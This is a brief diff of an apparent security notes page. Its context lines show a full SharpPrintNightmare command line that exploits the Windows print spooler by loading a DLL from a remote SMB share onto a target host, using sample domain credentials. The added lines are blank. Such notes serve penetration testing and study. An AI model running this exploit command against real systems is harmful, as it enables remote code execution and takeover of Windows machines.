@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:14.546143+00:00'
 ```bash
 SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
 ```
+
+
